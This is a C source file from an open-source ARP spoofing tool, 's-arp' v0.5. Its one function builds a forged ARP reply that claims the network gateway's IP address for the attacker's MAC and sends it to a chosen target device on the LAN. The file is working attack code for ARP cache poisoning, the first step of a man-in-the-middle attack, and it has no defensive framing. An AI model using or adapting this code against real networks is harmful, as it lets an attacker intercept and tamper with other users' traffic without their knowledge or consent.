/**
 * The s-arp project v0.5 - An ARP spoofing tool for your LAN.
 * Copyright (C) 2017  George G. Gkasdrogkas
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * Contact with the author at <georgegkas@gmail.com>.
 *
 */
#include "pcapARPSpoof.h"

void spoofTargetDevice(netDevices **targetDevice, wirelessInterface *WI) {
  unsigned char ARPBuffer[MAX_FRAME];
  size_t ARPBufferLength;
  etherHeader frameHeader;
  arpIPv4packet ARPData;
  int nsent = 0;
  /*
   *  Construct Ethernet frame header
   */
  // unsigned char spoofedMAC[ETH_ALEN] = {0x00, 0x03, 0xfe, 0x54, 0xac, 0x13}; // Cisco Systems, Inc.
  memcpy(frameHeader.destMAC, (*targetDevice)->MAC, ETH_ALEN);
  memcpy(frameHeader.srcMAC, WI->MAC, ETH_ALEN);
  frameHeader.type = htons(DEFAULT_ETHER_PRO);
  /*
   *  Construct the ARP Header.
   */
  memset(&ARPData, '\0', sizeof(arpIPv4packet));
  ARPData.htype = htons(DEFAULT_ARP_HTYPE);
  ARPData.ptype = htons(DEFAULT_ARP_PTYPE);
  ARPData.hlen = DEFAULT_ARP_HLEN;
  ARPData.plen = DEFAULT_ARP_PLEN;
  ARPData.op = htons(ARP_OP_RESPONSE);
  memcpy(ARPData.sha, WI->MAC, ETH_ALEN);

  memcpy(ARPData.tha, (*targetDevice)->MAC, ETH_ALEN);


  ARPData.spa = WI->gatewayAddress; // sourse ip address
  ARPData.tpa = (*targetDevice)->address;
  

  packageARP(ARPBuffer, &frameHeader, &ARPData, &ARPBufferLength);
 
  nsent = pcap_sendpacket(pcapARPHandler, ARPBuffer, ARPBufferLength);

  if (nsent < 0) {
    throwErrorScreen(pcap_geterr(pcapARPHandler), PCAP_SEND_SPOOFED_ARP_RESPONSE);
  } else {
    (*targetDevice)->state = SPOOFED;
  }
}